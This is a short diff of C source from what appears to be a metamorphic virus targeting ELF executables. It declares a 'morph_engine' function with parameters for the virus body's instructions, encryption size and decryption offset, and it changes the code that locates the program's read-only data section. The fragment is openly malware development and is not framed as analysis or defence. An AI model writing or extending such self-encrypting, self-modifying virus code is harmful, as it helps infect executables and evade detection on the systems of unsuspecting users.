@@ -19,7 +19,8 @@ If different value, update the _LOAD_ value below to match the _FIRST_ LOAD valu
 
 char *filename;
 
-unsigned long data_start_addr;
+unsigned long data_start_addr; /* this is the location of rodata when program executed */
+unsigned long data_start_offset; /* this is the location of rodata when program executed and opened the program file in memory */
 unsigned long data_size;
 
 extern int morph_engine(char* exe_data, size_t virus_instruction_begin, size_t virus_encrypt_size, size_t virus_decrypt_offset);
@@ -42,7 +43,7 @@ void print_section(Elf64_Shdr *shdr, char *strTab, int shNum, uint8_t *data)
 
   for(i = 0; i < shNum; i++) {
     size_t k;
-    if(strcmp(".data", &strTab[shdr[i].sh_name]) == 0){
+    if(strcmp(".rodata", &strTab[shdr[i].sh_name]) == 0){
 		data_start_addr =  shdr[i].sh_addr;
 		unsigned long next_section_after_data_addr = shdr[i+1].sh_addr;
 		data_size = next_section_after_data_addr - (unsigned long) data_start_addr;
